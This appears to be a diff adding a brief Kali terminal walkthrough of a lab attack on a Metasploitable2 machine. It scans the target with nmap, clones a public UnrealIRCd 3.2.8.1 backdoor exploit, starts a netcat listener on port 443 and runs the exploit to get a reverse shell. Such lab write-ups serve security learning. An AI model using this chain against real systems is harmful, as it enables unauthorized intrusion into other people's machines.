@@ -1,0 +1,29 @@
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ping -c 1 thetargetmachinesIP
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo nmap -p- -sC -sV --open -sS -n -Pn thetargetmachinesIP -oN thedirectoryyouchoose
+
+# In the previous scan, we've seen the vulnerability 6667, UnrealIRCd. That's why we've use that exploit
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo su 
+
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# git clone https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor.git
+
+┌──(root㉿kali)-[/home/kali/Desktop/UnrealIRCd-3.2.8.1-Backdoor]
+└─# nano exploit.py
+
+#Change local IP and port 
+
+┌──(root㉿kali)-[/home/kali/Desktop/UnrealIRCd-3.2.8.1-Backdoor]
+└─# chmod +x exploit.py
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo nc -nlvp 443
+
+┌──(root㉿kali)-[/home/kali/Desktop/UnrealIRCd-3.2.8.1-Backdoor]
+└─# ./exploit.py thetargetmachinesIP 6667 -payload netcat
+
+# Then, in the netcat listener, if the exploit launch was succesful, we've hacked the Target Machine. (In this case, a Metasploitable2)
